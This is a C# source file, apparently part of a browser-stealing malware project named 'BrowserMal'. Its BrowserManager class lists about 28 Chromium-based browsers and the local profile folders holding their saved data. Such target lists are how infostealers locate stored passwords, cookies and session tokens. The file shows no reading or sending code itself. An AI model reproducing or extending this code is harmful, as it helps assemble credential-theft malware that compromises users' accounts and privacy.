using System;
using System.Collections.Generic;
using System.IO;

namespace BrowserMal.Browser
{
    public class BrowserManager
    {
        public static string LocalApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        public static string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        private readonly List<BrowserModel> _browserModelsList;

        public BrowserManager() => _browserModelsList = new List<BrowserModel>();

        public void Init()
        {
			_browserModelsList.Add(new BrowserModel("Comodo Dragon", Path.Combine(LocalApplicationData, @"Comodo\Dragon\User Data"), "dragon"));
			_browserModelsList.Add(new BrowserModel("Brave Browser", Path.Combine(LocalApplicationData, @"BraveSoftware\Brave-Browser\User Data"), "brave"));
			_browserModelsList.Add(new BrowserModel("Chrome", Path.Combine(LocalApplicationData + @"\Google\Chrome\User Data"), "chrome"));
			_browserModelsList.Add(new BrowserModel("Opera", Path.Combine(ApplicationData, @"Opera Software\Opera Stable"), "opera"));
			_browserModelsList.Add(new BrowserModel("Yandex", Path.Combine(LocalApplicationData, @"Yandex\YandexBrowser\User Data"), ""));
			_browserModelsList.Add(new BrowserModel("360 Browser", Path.Combine(LocalApplicationData + @"\360Chrome\Chrome\User Data"), ""));
			_browserModelsList.Add(new BrowserModel("CoolNovo", Path.Combine(LocalApplicationData, @"MapleStudio\ChromePlus\User Data"), ""));
			_browserModelsList.Add(new BrowserModel("SRWare Iron", Path.Combine(LocalApplicationData, @"Chromium\User Data"), ""));
			_browserModelsList.Add(new BrowserModel("Torch Browser", Path.Combine(LocalApplicationData, @"Torch\User Data"), ""));
			_browserModelsList.Add(new BrowserModel("Iridium Browser", Path.Combine(LocalApplicationData + @"\Iridium\User Data"), ""));
			_browserModelsList.Add(new BrowserModel("7Star", Path.Combine(LocalApplicationData, @"7Star\7Star\User Data"), ""));
			_browserModelsList.Add(new BrowserModel("Amigo", Path.Combine(LocalApplicationData, @"Amigo\User Data"), ""));
			_browserModelsList.Add(new BrowserModel("CentBrowser", Path.Combine(LocalApplicationData, @"CentBrowser\User Data"), ""));
			_browserModelsList.Add(new BrowserModel("Chedot", Path.Combine(LocalApplicationData, @"Chedot\User Data"), ""));
			_browserModelsList.Add(new BrowserModel("CocCoc", Path.Combine(LocalApplicationData, @"CocCoc\Browser\User Data"), ""));
			_browserModelsList.Add(new BrowserModel("Elements Browser", Path.Combine(LocalApplicationData, @"Elements Browser\User Data"), ""));
			_browserModelsList.Add(new BrowserModel("Epic Privacy Browser", Path.Combine(LocalApplicationData, @"Epic Privacy Browser\User Data"), ""));
			_browserModelsList.Add(new BrowserModel("Kometa", Path.Combine(LocalApplicationData, @"Kometa\User Data"), ""));
			_browserModelsList.Add(new BrowserModel("Orbitum", Path.Combine(LocalApplicationData, @"Orbitum\User Data"), ""));
			_browserModelsList.Add(new BrowserModel("Sputnik", Path.Combine(LocalApplicationData, @"Sputnik\Sputnik\User Data"), ""));
			_browserModelsList.Add(new BrowserModel("uCozMedia", Path.Combine(LocalApplicationData, @"uCozMedia\Uran\User Data"), ""));
			_browserModelsList.Add(new BrowserModel("Vivaldi", Path.Combine(LocalApplicationData, @"Vivaldi\User Data"), ""));
			_browserModelsList.Add(new BrowserModel("Sleipnir 6", Path.Combine(ApplicationData, @"Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer"), ""));
			_browserModelsList.Add(new BrowserModel("Citrio", Path.Combine(LocalApplicationData, @"CatalinaGroup\Citrio\User Data"), ""));
			_browserModelsList.Add(new BrowserModel("Coowon", Path.Combine(LocalApplicationData, @"Coowon\Coowon\User Data"), ""));
			_browserModelsList.Add(new BrowserModel("Liebao Browser", Path.Combine(LocalApplicationData, @"liebao\User Data"), ""));
			_browserModelsList.Add(new BrowserModel("QIP Surf", Path.Combine(LocalApplicationData, @"QIP Surf\User Data"), ""));
			_browserModelsList.Add(new BrowserModel("Edge Chromium", Path.Combine(LocalApplicationData, @"Microsoft\Edge\User Data"), "msedge"));
        }

		public List<BrowserModel> GetBrowsers() => _browserModelsList;
    }
}
